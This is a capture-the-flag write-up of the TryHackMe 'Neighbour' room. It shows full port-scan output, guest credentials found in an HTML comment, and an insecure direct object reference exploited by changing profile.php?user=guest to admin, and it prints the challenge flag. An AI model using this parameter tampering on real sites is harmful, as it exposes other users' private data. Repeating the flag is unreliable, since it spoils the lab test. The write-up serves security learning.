---
Check out our new cloud service, Authentication Anywhere. Can you find other user's secrets?
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/50b36562adeae07c397af704d3922a16.png)

 Neighbour

 Start Machine

Check out our new cloud service, Authentication Anywhere -- log in from anywhere you would like! Users can enter their username and password, for a totally secure login process! You definitely wouldn't be able to find any secrets that other people have in their profile, right?

**Access this challenge** by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [http://MACHINE_IP](http://machine_ip/)[](http://machine_ip/)

  

Check out similar content on TryHackMe:

-   [IDOR](https://tryhackme.com/room/idor)

Answer the questions below

Find the flag on your neighbor's logged in page!

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.75.171 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.75.171:22
Open 10.10.75.171:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 14:01 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Initiating Ping Scan at 14:01
Scanning 10.10.75.171 [2 ports]
Completed Ping Scan at 14:01, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:01
Completed Parallel DNS resolution of 1 host. at 14:01, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:01
Scanning 10.10.75.171 [2 ports]
Discovered open port 22/tcp on 10.10.75.171
Discovered open port 80/tcp on 10.10.75.171
Completed Connect Scan at 14:01, 0.18s elapsed (2 total ports)
Initiating Service scan at 14:01
Scanning 2 services on 10.10.75.171
Completed Service scan at 14:02, 6.54s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.75.171.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:02
Completed NSE at 14:02, 5.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:02
Completed NSE at 14:02, 0.76s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Nmap scan report for 10.10.75.171
Host is up, received syn-ack (0.18s latency).
Scanned at 2022-12-26 14:01:54 EST for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d052fab208bb6b5747c49d0b16075f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIdtO73KtmX5oatE25SWTz9f3hH5TUhhWJYIH6v3610ywZO/jeVFOPzbxDMXnyg5S2dB8dAvr/knbTsR6Gh1FN58V+J/cBZ9F7b1U3Vp2sFrZPYCgtMzrUr3bVmR7FmOT+QwrKtGmy7aVGSReODiC3MrOiUJiu5hK3XciVDQyq8JiX5w/RIadqj2smEuTjCOrSm7mkfiMAsNBHlmficzC5TieNHyzw0/In8doeqEKdfmvR8Loc0K8tbCZGa7zdg4nglSJyRI9yw4EmvMNDIgCUyRLJl9RNW/CfH2EEBH1GFgjt47xjyA1FijQ+ivmfvFKVR0Mu20xhbTZkyEejwCeHpvT6RMoJ16IeC1Ly6rNSupLZkflrJO5DdSgDDR+Spq4z7Y1cAAKbFoa3rgLND1aZm1ocv82tKbT9GLgKM4lMuxjh+PyFji/aEmgHWp1gGuwh8sESkr7tyv60O+M+hQgv7NOMuqliBRqjoVRoXa30XmgFD2eHa4x5vox9aDY1Bj8=
|   256 d5dbf71338d8abbc8e3df6958f4d4150 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIYtRAchO2zKv/ts4gorhy9Z93QkKUYGALmYTQzYbl1IkYVjAOjLZtFHgfnqHASi6tm3NdHOK4gGYmPhkJBJzoc=
|   256 152265fea15a975efc7b242c9308e94b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAH+drNQtx3cj4Rl+nGEbDdvrLJDBeoIAvWirJ2OfQhW
80/tcp open  http    syn-ack Apache httpd 2.4.53 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.53 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds

http://10.10.75.171/login.php

view-source:http://10.10.75.171/login.php

 <!-- use guest:guest credentials until registration is fixed -->

login

http://10.10.75.171/profile.php?user=guest

Hi, guest. Welcome to our site. Try not to peep your neighbor's profile.

view-source:http://10.10.75.171/profile.php?user=guest

<!-- admin account could be vulnerable, need to update -->

http://10.10.75.171/profile.php?user=admin

Hi, admin. Welcome to your site. The flag is: flag{66be95c478473d91a5358f2440c7af1f}

```

*flag{66be95c478473d91a5358f2440c7af1f}*


[[Library]]